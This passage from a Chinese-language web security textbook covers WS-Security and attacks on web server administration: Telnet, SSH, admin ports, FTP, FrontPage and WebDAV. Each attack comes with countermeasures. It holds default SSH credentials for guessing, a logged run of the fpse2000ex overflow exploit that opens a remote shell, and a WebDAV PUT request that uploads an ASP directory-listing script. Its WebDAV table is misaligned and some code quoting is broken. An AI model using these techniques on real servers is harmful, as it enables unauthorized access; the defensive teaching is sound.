(024) </xenc:EncryptedKey>
(025) [additional headers here for signature, etc. as required]
(026) </wsse:Security>
(027) </S:Header>
(028) <S:Body>
(029) <xenc:EncryptedData
Type="http://www.w3.org/2001/04/xmlenc#Element"
Id="enc1">
(030) <xenc:EncryptionMethod
Algorithm="http://www.w3.org/2001/04/xmlenc#3des-cbc"/>
(031) <xenc:CipherData>
(032) <xenc:CipherValue>d2FpbmdvbGRfE01m4byV0...
(033) </xenc:CipherValue>
(034) </xenc:CipherData>
(035) </xenc:EncryptedData>
(036) </S:Body>
(037) </S:Envelope>

让我们检查下这个 SOAP 消息的元素，来看看 WS-Security 是如何提供安全性的。在第 3 行，以 SOAP 头开始的 10 行是新的 WS-Security 头，wsse:Security 界定了在 SOAP 头中的 WS-Security 信息。就像在第 11 行的注释那样，在一个 SOAP 消息中，可以有几个 WS-Security 头，描述认证令牌，加密密钥等等。在我们这个特定的例子里，显示了 xenc:EncryptedKey 头，描述了如何用一个加密密钥来加密 SOAP 消息内容中的一部分（第 12 行）。注意，加密密钥本身是用的消息接收者的公钥（接收者是第 15 行中的“Alice”）

并以 RSA 非对称加密的。加密后的内容元素是第 22 行的 “enc1.”。在 SOAP 消息体的下面，第 29 行，我们可以看到使用密钥并用 3DES 加密的数据（注意 Id= “enc1”）。总的来说：

- 头 第 18 行，3DES 对称加密密钥（使用接收者的公钥进行加密）。

☐ 体 第 32 行，3DES 加密后的数据内容。

Alice 可以接收这个消息，用她的私钥解密 3DES，然后用 3DES 的密钥来解密数据。忽略认证和密钥分发问题，我们已经获得 SAOP 消息内容强健的机密性。

在我们写这些的时候，WS-Security仍然还在发展中。但是很显然，它被用来整合多个已经建立的安全消息构架，包括非对称的密钥加密，并且它有Web技术重量级的公司IBM和Microsoft的支持。我们也和一些Web开发企业讨论过，他们非常期望使用WS-Security进来加固各种应用程序间通信——请注意这个领域的发展。

### 8.4 小结

如果应用程序间通信的历史在不断地重复，那么 Web 服务架构在网络上公布的应用程序信息将只会受到更多的应用攻击。在本章，我们提供了这类攻击的一些具体例子。至少，这对于 Web 结构设计师和开发人员设计和编写安全代码，将带来更为严重的负担。你可以运行但不能隐藏 Web 服务——特别像 SOAP，WSDL 和 UDDI 这样的技术将门大大打开供人长驱直入。记住，Web 安全的基础——防火墙对应用层的攻击表现很弱，服务器（尤其是 HTTP 服务器）必须很好地配置和打全补丁，并尽可能地使用严格的认证和授权，并且任何时候都要使用正确的输入验证。随着像 WS-Security 之类规范的成熟而逐步采用它们。勇敢地走进 Web 服务的新世界！

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>参 考</td><td style='text-align: center; word-wrap: break-word;'>链 接</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>通用的参考</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>XML</td><td style='text-align: center; word-wrap: break-word;'>http://www.w3.org/TR/REC-xml/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WSDL</td><td style='text-align: center; word-wrap: break-word;'>http://www.w3.org/TR/wsdl</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UDDI</td><td style='text-align: center; word-wrap: break-word;'>http://www.uddi.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SOAP</td><td style='text-align: center; word-wrap: break-word;'>http://www.w3.org/TR/SOAP/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>微软关于 XML Web 服务的文章</td><td style='text-align: center; word-wrap: break-word;'>http://msdn.microsoft.com/vstudio/techinfo/</td></tr></table>

http://msdn.microsoft.com/msdnmag/issues/02/02/xml/

XPath 查询

http://msdn.microsoft.com/library/

default.asp?url=/library/en-us/dnbda/html/

bdadotnetsamp0.asp

http://www.developer.com/xml/article.php/3383961

Web 服务漏洞

“XML 外部实体攻击”

http://www.securiteam.com/securitynews/

6D0100A5PU.html

Amit Klein 的文章：“盲 XPath 注入”

http://www.webappsec.org/projects/threat/

classes/xpath_injection.shtml

http://www.watchfire.com/resources/blind-xpath-injection.pdf

### Web 服务安全

IBM.com 的 WS-Security

Microsoft.com 的 WS-Security

Verisign.com 的 WS-Security

XML 签名

SAML

http://www.ibm.com/developerworks/library/ws-secure/

http://msdn.microsoft.com/ws-security/

http://www.verisign.com/wss/

http://www.w3.org/TR/xmldsig-core/

http://www.oasis-open.org/committees/tc_cat.php?cat=security

http://www.oasis-open.org/committees/tc_cat.php?cat=security

## 第 9 章 攻击 Web 应用管理

对于本书的大部分，我们都着重讲述攻击者从 Web 应用的前门发起攻击。是否存在其他进入 Web 应用程序的途径呢？那是当然存在的——大多数 Web 应用服务器都提供了大量的接口来支持内容管理、服务器管理、配置等等。通常情况下，这些接口能够通过 Internet 访问，因为 Internet 是远程管理 Web 应用的最方便的方法之一。这一章会分析一些最常见的管理平台以及与 Web 应用管理有关的漏洞。我们也会讨论常见的 Web 管理员误配置和开发者错误。我们的讨论分为下列几个部分：

○ 远程服务器管理

○ Web 内容管理/创作

○ 管理员错误配置

☐ 开发者造成的错误

### 9.1 远程服务器管理

是的，人们的确偶尔通过 Internet 来远程管理他们的 Web 服务器。这些管理接口依赖于所选择的协议，同时也为机会主义攻击者打开了一扇很有吸引力的窗口。我们将在这一节简要介绍最常见的机制及其弱点。

提示 关于远程管理功能漏洞的全面论述，请参见 McGraw-Hill/Osborne.的 Hacking Exposed 系列的最新版：网络安全机密与解决方案（英文名为 Network Security Secrets & Solutions，在写这本书内容的时候，该书为第 5 版）。

在开始之前，我们需要简要介绍下 Web 管理。我们推荐在专门进行 Web 管理的单个系统上运行远程管理服务，然后用这个系统连接各个 Web 服务器——不要在每个 Web 服务器上都配置远程管理。这将使攻击面限制在一个服务器上，而且也允许从一个严格限制和审

计的中心位置，来管理多个 Web 服务器。哦，是的，如果有人设法攻陷了远程管理服务器，那么所有的服务器也将受到威胁。但涉及远程控制的时候，我们仍更喜欢“将所有的鸡蛋放在一个篮子里，然后看管好篮子”。

提示 为了远程管理服务器的安全，CERT 已经发布了一些通用的建议——其链接请参见本章末尾的“参考和进一步阅读”一节。

#### 9.1.1 Telnet

我们今天仍然可以看见 Telnet 用于 Web 服务器的远程管理。好像需要重申一下，Telnet 是一个明文协议，容易受到网络中间节点的窃听攻击（即，有人可以在你和 Web 服务器传输过程中嗅探到你的 Telnet 密码）。不要再为“在 Internet 上嗅探密码有多困难”这个古老观点争论不休——这不是 Internet 的问题，而是你的 Telnet 流量需要经过很多其他网络（想象下你的公司网络，你的 ISP 网络等）才能到达 Internet 上。而且，诸如 SSH 这样的协议可以用来提供更高的安全性，那为什么你还要冒这个险呢？

如果对查看 Web 服务器是否使用了 Telnet 感兴趣，你可以使用任何端口扫描器扫描 TCP 端口 23，或者简单地打开命令行，尝试对 Web 服务器进行一个 Telnet 连接。

### 9.1.2 SSH

安全 Shell（Secure Shell，SSH）多年来一直是安全远程管理的主要方法（至少比 Telnet 更安全）。它采用加密技术来保护认证和认证后的数据传输，因此避免了像 Telnet 那样容易被窃听的缺陷。应该注意到，在基于 SSH 版本 1（SSH1）协议的某些实现中，发现了一些严重的漏洞，因此，不要只是因为它的名字里面有“安全”两个字，就可以不关注最新的安全站点和补丁。我们推荐至少使用 SSH2。

有意思的是，SSH 也通过安全拷贝（Secure Copy，scp）程序支持文件传输，这一点使得它对那些想同时管理 Web 服务器内容的人更有吸引力。我们会在后面的“Web 内容管理”中再次讨论 scp。

因为 SSH 经常作为一个远程管理工具使用，所以在进行 Web 应用审计时，我们通常把 SSH（TCP 端口 22）包含在我们的查找和扫描列表里。SSH 对密码猜测攻击仍然是脆弱的，所以在进行 Web 审计时，尝试一些简单的密码猜测绝对是有利无弊的（比如 root:[NULL]，root:root，root:admin，admin:[NULL] 等）。

### 9.1.3 私有的管理端口

很多 Web 服务器默认带有一些它们私有的 Web 管理接口。这些接口通常是 HTTP 服

务器的另一个实例，用来访问 HTML 或配置服务器的脚本文件。它们通常使用 HTTP 基础认证。表 9-1 列出了主流 Web 服务器提供商使用的常见端口（我们在第 2 章见到了其中的大部分，但觉得有必要在这里重复一下）。

很多端口是用户定义的，它们不是那么容易识别，除非你愿意扫描子网的全部 65535 个端口。很多端口也通过认证机制保护，通常是 HTTP 基础认证或登录表单。但是，在我们的工作中，已经看到了大量容易被猜测的密码，这样的端口保护也成为 Web 审计很值得调查的一个领域。

#### 9.1.4 其他管理服务

有很多方法可以实现远程服务器管理，当然，之前的讨论并不意味着只能用服务来管理 Web 服务器。我们已经看到过各种各样的远程控制软件可以实现该目的，在我们的经验中，AT&T 实验室的 VNC 是最流行的工具（参见《黑客大曝光：网络机密与解决方案》的最新版，英文名为 Hacking Exposed: Network Secrets&Solutions，McGraw-Hill/Osborne 出版社），VNC 默认监听 TCP 端口 5800。另一个非常流行的远程管理工具是微软的终端服务，它监听 TCP 端口 3389。

其他流行的远程管理协议包括：在 UDP 161 上的简单网络管理协议（Simple Network Management Protocol，SNMP）和在 TCP/UDP 389 上的轻量级目录访问协议（Lightweight Directory Access Protocol，LDAP），LDAP 有时作为 Web 服务器用户和管理员的认证服务器。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>端口</td><td style='text-align: center; word-wrap: break-word;'>HTTP 管理提供商</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>900</td><td style='text-align: center; word-wrap: break-word;'>IBM WebSphere 默认管理客户端</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2301</td><td style='text-align: center; word-wrap: break-word;'>Compaq 的 Insight Manager</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2381</td><td style='text-align: center; word-wrap: break-word;'>基于 SSL 的 Compaq Insight Manager</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4242</td><td style='text-align: center; word-wrap: break-word;'>Microsoft Application Center 远程管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>7001</td><td style='text-align: center; word-wrap: break-word;'>BEA WebLogic 的默认端口</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>7002</td><td style='text-align: center; word-wrap: break-word;'>基于 SSL 的 BEA WebLogic 的默认端口</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>7070</td><td style='text-align: center; word-wrap: break-word;'>基于 SSL 的 Sun Java Web 服务器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8000</td><td style='text-align: center; word-wrap: break-word;'>备用 Web 服务器或 Web 缓存</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8001</td><td style='text-align: center; word-wrap: break-word;'>备用 Web 服务器或管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8005</td><td style='text-align: center; word-wrap: break-word;'>Apache Tomcat</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8008</td><td style='text-align: center; word-wrap: break-word;'>Novell NetWare 5.1 管理端口</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8080</td><td style='text-align: center; word-wrap: break-word;'>备用 Web 服务器，或者 Squid 缓存控制（cachemgr.cgi），或者 Sun Java Web 服务器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8100</td><td style='text-align: center; word-wrap: break-word;'>Allaire JRUN</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>端口</td><td style='text-align: center; word-wrap: break-word;'>HTTP 管理提供商</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>88x0</td><td style='text-align: center; word-wrap: break-word;'>端口 8810, 8820, 8830 等通常属于 ATG Dynamo</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8888</td><td style='text-align: center; word-wrap: break-word;'>通常用做备用 HTTP 服务器或管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>9090</td><td style='text-align: center; word-wrap: break-word;'>Sun Java Web server 管理模块</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>10,000</td><td style='text-align: center; word-wrap: break-word;'>Netscape Administrator 接口（默认）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>XXXX</td><td style='text-align: center; word-wrap: break-word;'>Microsoft IIS, 随机的 4 位高端口号, 默认情况下限制为本机的源 IP 访问</td></tr></table>

### 9.2 Web 内容管理

好，你现在有了 Web 服务器，也有一些动态的内容……那么如何将这两部分结合起来呢？显然，必须制定一些机制用来传输文件到 Web 服务器上去，通常这些机制是很方便使用的：使用 FTP 或 SSH（然后使用 scp），或者使用手边诸如微软的 FrontPage 私有协议来连接到 Web 服务器。老谋深算的攻击者也会寻找这些接口来作为攻击 Web 应用的备选措施。本节将讨论大多数常见机制的优缺点。

注意 我们这里关注面向 Internet 的机制,而忽略防火墙背后的技术,比如 Sun 的 NFS, Microsoft 文件共享,或者 Microsoft 的应用中心负载均衡和内容发布平台。

### 9.2.1 FTP

普遍接受的安全原则是,不要在你的 Web 应用服务器上运行除了 HTTP 外的任何东西。因此,你可以想象我们会对运行 FTP 说些什么,而且诸如 Washington 大学的 Wuftp 等主流 FTP 服务器软件不断报告发现漏洞,所以:不要在你的 Web 服务器上运行 FTP! 这样做的风险太大,如果某人猜测到一个账号密码或发现一个能让他们写入到文件系统的攻击点,那么离 Web 毁灭（或者更糟的事情）只有一步之遥了。如果对 FTP 服务的访问限制在一特定小范围的 IP 地址里,那就另当别论,这也是该原则的唯一例外。

不过，在一个全面的 Web 应用审计里，检查 FTP 以确认某些开发者没有采用简单的 FTP 法则总是需要的。FTP 在 TCP 端口 21 上，用任何端口扫描器都可以发现。

#### 9.2.2 SSH/scp

就像在本章前部分我们关于 Web 管理技术的讨论中提到的那样, 安全 Shell 版本 2(SSH2) 是我们推荐的远程 Web 服务器管理协议（假设能够正确地维护）。有一个叫做 Secure Copy（scp）的工具，可以用来连接 SSH 服务并用 SSH 隧道（经过认证和加密）传输文件。如果

你是一个命令行拥护者，那么这是你最好的选择，但是这比图形化内容管理工具比如FrontPage（参见下一节）要原始一些。嗯，安全是有代价的……唉！

我们前面提到过，如果你对检查 SSH 和尝试密码猜测攻击感兴趣，SSH 在 TCP 端口 22 上。前面我们也说过，有一些和特定 SSH1 守护进程相关的远程漏洞。

### 9.2.3 FrontPage

Microsoft 的 FrontPage（FP）Web 创作工具是众多 Web 站点内容管理平台中比较受欢迎，也是容易使用的工具之一。它最初是面向希望在单个 Web 服务器上创建和管理内容的低中端用户，但是现在得到了面向个人和各种规模的业务的大型 Web 提供商的普遍支持。

FP 实际上是客户端，而 FP 服务器扩展（FP Server Extensions，FPSEs）运行在服务器端，授权用户可以进行远程内容操作。FPSE 是 IIS5 的默认组件，它配备了一组 HTML 文件、脚本、可执行文件和 DLL，这些 DLL 位于在一系列名为\_vti_* 虚拟根目录下。其中，星号代表任何 bin、cnf、log、pvtt、script 和 txt（FrontPage 是从 Vermeer Technologies 公司购买的，因此带有 vti）。下面的请求/响应很好地说明了一个运行的 FPSE:

C:\>nc -vv luxor 80

luxor [192.168.234.34] 80 (http) open

GET /_vti_bin/shtml.dll HTTP/1.0

HTTP/1.1 200 OK

Server: Microsoft-IIS/5.0

Date: Thu, 07 Mar 2002 04:38:01 GMT

Content-Type: text/html; charset=windows-1252

<HTML><BODY>Cannot run the FrontPage Server Extensions' Smart HTML interpreter on this non-HTML page: "</BODY></HTML>

FP 的通信在 HTTP 之上，通过一个叫做 FrontPage 远程过程调用（FrontPage Remote Procedure Call，RPC）的私有协议传输。把方法 POST 到相关 FP DLL 上，如下例所示：

POST /test2/_vti_bin/_vti_aut/author.dll HTTP/1.0
Date: Thu, 18 Apr 2002 04:44:28 GMT
MIME-Version: 1.0
User-Agent: MSFrontPage/4.0
Host: luxor
Accept: auth/sicily
Content-Length: 62
Content-Type: application/x-www-form-urlencoded
X-Vermeer-Content-Type: application/x-www-form-urlencoded
Proxy-Connection: Keep-Alive

Pragma: no-cache

method=open+service%3a4%2e0%2e2%2e3406&service%5fname=%2ftest2

第一行文字指明了作为 POST 目标的 DLL，最后一行指明了要调用的方法（在这个例子中，FP 客户端试图打开 test2 应用程序目录进行编辑，从最后一行的 `fname=/test2` 语法可以看出）。FPSE 方法也可以在 URL 查询字符串参数中调用，就像下面这样（由于页面宽度的限制，进行了换行）。

/_vti_bin/_vti_aut/author.dll?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=false

默认情况下，FP 创作工具对一个服务器的访问采用的是 Windows 授权（基于 HTTP 的 NTML，参看第 4 章），因此不要有这样的印象：攻击者可以轻易地穿越任何运行 FPSE 的服务器前门，虽然对默认的安全级别些许放宽都可能导致这个问题。如果你关注 FP 服务器的安全（因为虚拟根目录允许调用 FP 创作工具访问），可以在 IIS 5 的 IISAdmin 工具（iis.msc）里右击任意服务器，选择 “All Tasks” | “Check Server Extensions”，你会得到如下所示的提示：

如果你选择了检查服务器扩展（Check Server Extensions），将会执行下面的任务：

☐ 检查 Web 上的读权限。

o 检查 Service.cnf 和 Service.lck 读/写。

o 更新 Postinfo.html 和\_vti\_inf.htm。

o 证实_vti_pvt，_vti_log 和_vti_bin 已经安装，而且_vti_bin 是可执行的。

○ 检查虚拟目录或者 metabase 设置是正确的，而且是最新的。

o 检查 IUSR_machinename 账号确实没有写权限。

- 如果你在一个 FAT 文件系统上运行，系统会给你警告，因为 FAT 意味着你不能支持任何 Web 安全。

提示 你也可以使用 Microsoft 的 URLScan 工具来控制对 FrontPage 的访问；参见本章末尾的“参考和进一步阅读”来获得关于 URLScan 工具如何控制对 FrontPage 的访问的链接。

几年来，FP 服务器扩展在安全方面名声很坏。最受公众抨击的问题是运行在 UNIX 系统 Apache HTTP 服务器上的 FrontPage 98 服务器扩展，它允许远程攻击一个服务器的根目录。人们还发现了一些危害性比这轻一点的，针对各种 FP 版本机器的攻击。

个人的意见是，我们不认为 FP 因此就是一个糟糕的 Web 内容管理平台。所有已经公布的漏洞都已经修复，最近的绝大部分漏洞的危害都不是那么严重（最严重的可能就是路径暴露了）。我们稍后将讨论一个与 FPSE 相关的严重问题，但是，如果你仔细地阅读，就会注意到它是和 Visual InterDev 组件相关而不是 FPSE 本身的问题。因此，无论何时有人问我们推荐什么远程 Web 内容管理，我们会毫不犹豫地推荐 FrontPage 2002 或更高版本。但是我们牢记这句耳熟能详的告诫：任何用单一手段实现的技术都可能存在漏洞。因此，如果你使用 FrontPage，要确认你已经理解它的结构以及如何正确的配置它。

### FrontPage VSRAD 缓冲区溢出

流行度：7
简单度：9
影响度：10
风险度：9

最近最严重的 FPSE 相关漏洞，是在 2001 年中期由中国安全研究小组绿盟（NSFocus）发现的缓冲区溢出漏洞。我们说它和 FPSE 相关，是因为绿盟确实在 FPSE 的一个叫做 Visual Studio 远程应用程序部署（Remote Application Deployment，RAD）的子组件里发现了问题。VSRAD 允许 Microsoft Visual InterDev Web 开发平台的用户管理在远程 IIS 服务器上的组件。VSRAD 并不在 Windows 2000 上默认安装，而且当选择添加它时，会弹出一个警告，警告用户这是一个开发工具，不应该在产品中配置。

如果你忽略这个警告，任何连接到你的 Web 服务器的人都能够对你发起攻击。绿盟发布了一个叫做 fpse2000ex.exe 的概念验证代码，攻击这个缓冲区溢出漏洞并给攻击者系统回连一个 Shell。我们曾经在一个大型跨国客户端上使用该工具攻击一个双宿主的 Web 服务器，如下列代码所示（为了保密已经改变了 IP 地址）。注意，在发出攻击代码后，需要敲回车键才能弹出这个 Shell，接下来的命令也同样需要回车后才能生效。我们使用 Win32 上的 Cygwin 编译的这段攻击代码。

C:\>fpse2000ex.exe 192.168.1.254

buff len = 2201

payload sent!

exploit succeed

Press CTRL_C to exit the shell!

Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.
C:\WINNT\system32>
ipconfig
C:\WINNT\system32>ipconfig

Windows 2000 IP Configuration

Ethernet adapter Internet:

Connection-specific DNS Suffix . :
IP Address. . . . . . . . . . . . : 192.168.1.254
Subnet Mask . . . . . . . . . . . : 255.255.255.128
Default Gateway . . . . . . . . : 192.168.1.1

Ethernet adapter Admin:

Connection-specific DNS Suffix . :
IP Address. . . . . . . . . . . : 10.230.226.73
Subnet Mask . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . . :

一旦用 fpse2000ex.exe 完成了对 Web 服务器外围的攻击，我们就可以尝试攻击内部接口（就是前面例子中的“Admin”），并随之攻克公司的整个内部结构。因此你可以看到，如果没有正确的配置，FPSE 是很危险的。

#### ☐ FPSE VSRAD 对抗措施

这是一个很容易修补的漏洞：不要在面向 Internet 的机器上配置 FPSE VSRAD 支持。默认情况下是不安装 FPSE VSRAD 的，如果你想检查是否安装了该程序，请到“控制面板”的“添加/删除程序”，选择“添加/删除 Windows 组件”，选择“Internet 信息服务I细节”，并确保已经关闭了 Visual InterDevRAD 远程部署支持。Microsoft 建议，无论是否安装了 FPSE VSRAD 都要打补丁以防万一，这是一个好主意（当今很多组织的内网比 Internet 混乱多了）。补丁的位置列在本章末尾的“参考和进一步阅读”一节中。

#### 9.2.4 WebDAV

微软显然对 FrontPage 不满意，因此它很久前就支持一组叫做 Web 分布式创作和版本

管理（Web Distributed Authoring and Versioning，WebDAV 或只是 DAV）的 HTTP 扩展，用来支持 Web 内容管理。WebDAV 在 RFC2518 里面有描述，默认情况下微软的 IIS Web 服务器版本 5.0 及之后的版本都支持 WebDAV，并且大部分其他主流 Web 服务器都有 WebDAV 附加模块（甚至 Apache 也有 mod_dav）。

我们在 Hacking Exposed 的其他版本中公开宣布我们是 WebDAV 的怀疑者，主要是因为它提供了一个基于 HTTP 向 Web 服务器上写入内容的方法。除了文件系统的 ACL 外，WebDAV 并没有提供更多的内置安全措施。如果没有适当地限制该方法的使用，这将会是一场灾难。表 9-2 列出了一些更易滥用的 WebDAV 方法。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>WebDAV 方法</td><td style='text-align: center; word-wrap: break-word;'>描述</td><td style='text-align: center; word-wrap: break-word;'>请求的例子</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MKCOL</td><td style='text-align: center; word-wrap: break-word;'>创建一个新的集合（文件夹）</td><td style='text-align: center; word-wrap: break-word;'>MKCOL /newfolder/ HTTP/1.1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DELETE</td><td style='text-align: center; word-wrap: break-word;'>删除命名的资源</td><td style='text-align: center; word-wrap: break-word;'>DELETE /file.asp HTTP/1.1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PUT</td><td style='text-align: center; word-wrap: break-word;'>上传文件到服务器上</td><td style='text-align: center; word-wrap: break-word;'>PUT /nameofyourfile.asp HTTP/1.1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>COPY</td><td style='text-align: center; word-wrap: break-word;'>把资源拷贝到另一个位置</td><td style='text-align: center; word-wrap: break-word;'>Content-Length: 4</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MOVE</td><td style='text-align: center; word-wrap: break-word;'>把资源从一个地方移动到另一个地方</td><td style='text-align: center; word-wrap: break-word;'>test</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LOCK</td><td style='text-align: center; word-wrap: break-word;'>锁定资源防止修改</td><td style='text-align: center; word-wrap: break-word;'>COPY /copyme.asp HTTP/1.1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UNLOCK</td><td style='text-align: center; word-wrap: break-word;'>解锁被锁定的资源——需要一个锁令牌</td><td style='text-align: center; word-wrap: break-word;'>MOVE /moveme.asp HTTP/1.1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PROPFIND</td><td style='text-align: center; word-wrap: break-word;'>用来搜索一个资源的属性</td><td style='text-align: center; word-wrap: break-word;'>Destination: /putmehere/copyme.asp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PROPPATCH</td><td style='text-align: center; word-wrap: break-word;'>用来改变一个资源的属性</td><td style='text-align: center; word-wrap: break-word;'>LOCK /locked.asp HTTP/1.1</td></tr></table>

对表 9-2 作一些说明：对于 COPY 方法，所有的 WebDAV 资源都必须支持该方法，但这不意味着应用程序规定该权限存在，你就总是可以复制。通过 PROPFIND 方法，一个空的请求会返回一个默认属性列表。攻击者可以创建一个正确的 propfind 请求，包含一个带有搜索参数的 XML 体。

这几年来，公布了一些位于 WebDAV 现成软件里的漏洞。其严重级别大部分是中低级（从目录结构泄漏到拒绝服务）。在现在这个阶段，黑客团体好像只关注一些最容易达成的目标，因为很多公布的报告关注的都是 DoS 问题。

当然，本章不是讨论现成软件缺陷的（这方面的内容请参看第 3 章），而是讨论错误配置的。让我们来看看一些识别和利用 WebDAV 错误配置的常见方法。

Web 服务器在站点的受限部分启用 WebDAV 是非常常见的情况。比如，一个站点可能有一个带有有 PUT 命令的“upload”文件夹（http://www.site.com/upload/），使得用户可以上传内容到站点上。因为站点上的每个目录和子目录都有不同的命令和权限，所以在评估中的第一步是确认服务器上每个目录和文件的权限。你可以用 OPTIONS 命令轻松地完成。发现服务器文件和目录可用权限的最有效方法是使用站点的爬行结果所获取的数据，即枚举每个文件夹和文件来识别哪些拥有写权限。当在结果中发现了 MOVE，MKCOL，PUT 和 DELETE 时，那么你已经有了回报。下面是一个 HTTP 请求例子，显示了如何使用 OPTIONS 命令来制定站点根目录集合的 WebDAV 权限。

Host: www.site.com
HTTP/1.1 200 OK
Server: Microsoft-IIS/5.1
Date: Tue, 20 Sep 2005 17:46:18 GMT
X-Powered-By: ASP.NET
MS-Author-Via: MS-FP/4.0,DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT,
POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Cache-Control: private

接下来，我们检查给定的目录拥有什么样的权限，这样可以为我们找出更有趣的、可能可以通过 WebDAV 进行攻击的内容。我们以粗体标记这个例子目录所允许的修改方法。

OPTIONS /Folder1/any_filename HTTP/1.0
Host: www.site.com
HTTP/1.1 200 OK
Connection: close
Date: Tue, 20 Sep 2005 19:10:33 GMT
72

Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
MS-Author-Via: DAV
Content-Length: 0
Accept-Ranges: bytes
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, MKCOL, LOCK, UNLOCK
Cache-Control: private

就像你从这个例子中看到的那样,该目录允许使用一些功能相当强大的 WebDAV 方法（DELETE, PUT, MKCOL），攻击者可以轻易地利用它们。我们曾经看到过一种技术，就是上传一个脚本（在这个例子中，是一个.asp 页面），从 Web 根开始递归列出目录。

PUT /writable-folder/dirlisting.asp HTTP/1.1
Host: www.site.com
Content-Length: 1279

<h3>Directory listing of Webroot</h3>
<% ListFolderContents(Server.MapPath("/) %>
<% sub ListFolderContents(path)
  dim fs, folder, file, item, url
  set fs = CreateObject("Scripting.FileSystemObject")
  set folder = fs.GetFolder(path)

Response.Write("<li><b> " & folder.Name & "</b> - " _
  & folder.Files.Count & " files, ")
  if folder.SubFolders.Count > 0 then
    Response.Write(folder.SubFolders.Count & " directories, ")
  end if

Response.Write(Round(folder.Size / 1024) & " KB total." _
  & vbCrLf)

Response.Write("<ul> " & vbCrLf)

for each item in folder.SubFolders
    ListFolderContents(item.Path)

next

for each item in folder.Files

url = MapURL(item.path)
Response.Write(<li><a href="”“”&url&""">“”&item.Name&</a>
& item.Size & " bytes, "
& "last modified on " & item.DateLastModified & ". "
& "</li>" & vbCrLf)
next
Response.Write(</ul>" & vbCrLf)
Response.Write(</li>" & vbCrLf)
end sub
function MapURL(path)
    dim rootPath, url

    rootPath = Server.MapPath("/)
    url = Right(path, Len(path) - Len(rootPath))
    MapURL = Replace(url, "\\", "/")
end function %>
HTTP/1.1 201 Created
Connection: close
Date: Tue, 20 Sep 2005 19:31:54 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Location: http://www.site.com/writable-folder/myfile.asp
Content-Length: 0
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND,
PROPPATCH, SEARCH, LOCK, UNLOCK

你可能还会发现另一种更简单的方法，就是使用你的 WebDAV 客户端。如果你使用 Windows，那么你已经拥有了一个可以使用的 WebDAV 的客户端。遵循下面的步骤即可。

1. 在 IE 浏览器中，单击 “文件” | “打开” 菜单，输入上传 URL，并选中 “以 Web 文件夹方式打开” 选项，如下所示：

2. IE 会以 UNC 路径打开站点，根据需要拖放你的文件:

如果你使用的是 UNIX 或 Linux, 你可以下载一个叫做 Cadaver 的简单的命令行客户端。关于 Cadaver 的链接, 你可以在本章末尾的 “参考和进一步阅读” 一节中找到。

#### WebDav 创作（Authoring）对抗措施

有了微软的支持，WebDAV 得到了广泛部署。我们给出的关于 WebDAV 的最后建议是：在产品 Web 服务器上禁止它。如果这样不可行，你可以在一个单独的 HTTP 服务实例上运行它，并加上很严格的访问控制和认证。虽然如果你使用 WebDAV，你会希望你的创作者们能够使用 WebDAV 的所有可用方法，但是可能还是有必要限制服务器所支持的方法类型。确保你的创作者们都是可信的。

